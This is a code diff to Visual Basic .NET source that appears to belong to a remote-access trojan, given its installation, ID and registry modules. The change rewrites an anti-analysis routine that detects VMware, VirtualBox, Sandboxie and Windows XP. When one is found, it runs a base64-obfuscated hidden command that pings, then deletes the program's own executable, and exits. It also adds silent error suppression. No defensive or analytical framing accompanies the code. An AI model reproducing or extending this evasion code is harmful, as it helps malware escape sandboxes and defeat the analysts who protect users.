@@ -3,11 +3,11 @@
     Module C_Fuctions
 
         Function SB(ByVal s As String) As Byte() ' string to byte()
-            Return Text.Encoding.Default.GetBytes(s)
+            Return Text.Encoding.UTF8.GetBytes(s)
         End Function
 
         Function BS(ByVal b As Byte()) As String ' byte() to string
-            Return Text.Encoding.Default.GetString(b)
+            Return Text.Encoding.UTF8.GetString(b)
         End Function
 
         Function DLV(ByVal n As String) ' delete value in my Registry Key RG
@@ -51,17 +51,18 @@
         Sub Anti()
             Try
                 If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
-                    C_Installation.DEL()
-
+                    GoTo del
                 ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
-                    C_Installation.DEL()
-
+                    GoTo del
                 ElseIf Diagnostics.Process.GetProcessesByName("SbieSvc").Length >= 1 Then
-                    C_Installation.DEL()
-
+                    GoTo del
                 ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
-                    C_Installation.DEL()
+                    GoTo del
                 End If
+                Exit Sub
+del:
+                Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & Windows.Forms.Application.ExecutablePath & """", AppWinStyle.Hide, False, -1)
+                End
             Catch ex As Exception
             End Try
         End Sub
@@ -75,6 +76,7 @@
         End Sub
 
         Public Function GZip(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
+            On Error Resume Next
             If CM Then
                 Dim MS As New IO.MemoryStream
                 Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
